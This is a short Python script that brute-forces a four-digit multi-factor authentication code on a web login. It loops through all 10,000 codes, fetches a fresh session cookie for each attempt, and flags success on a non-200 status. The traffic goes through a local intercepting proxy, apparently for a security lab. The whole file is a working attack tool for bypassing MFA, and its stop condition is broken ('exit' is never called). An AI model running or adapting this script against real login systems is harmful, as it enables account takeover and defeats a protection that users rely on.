#!/usr/bin/python3

# waiting for 302 status code

import pyinputplus as pyip
from mkrequests import loginpagerequest, macrofunction
import re
# import logging
# logging.basicConfig(level=logging.DEBUG, format='%(lineno)d ~ %(message)s')



if __name__ == "__main__":
    URL=pyip.inputURL('Enter URL: ')
    # make the fist request
    proxies = {"https" : "http://127.0.0.1:8080"}
    
    for MFAcode in range(1,10000):
        MFAcode=str(MFAcode)
        zerostobeadded=4-len(MFAcode)
        MFAcode=zerostobeadded*'0'+MFAcode
        
        print(f"trying {MFAcode} : ", end='')
        # get the initial cookie
        response = loginpagerequest(URL)
        set_cookie = response.headers['Set-Cookie']
        pattern = re.compile(r'\w+')
        sessionCookie= pattern.findall(set_cookie)[1]

        # macro testing
        statuscode = macrofunction(URL, sessionCookie, MFAcode)
        print(f'status code - {statuscode}')
        if statuscode !=200:
            print('MFA Code : {0}'.format(MFAcode))
            exit
    




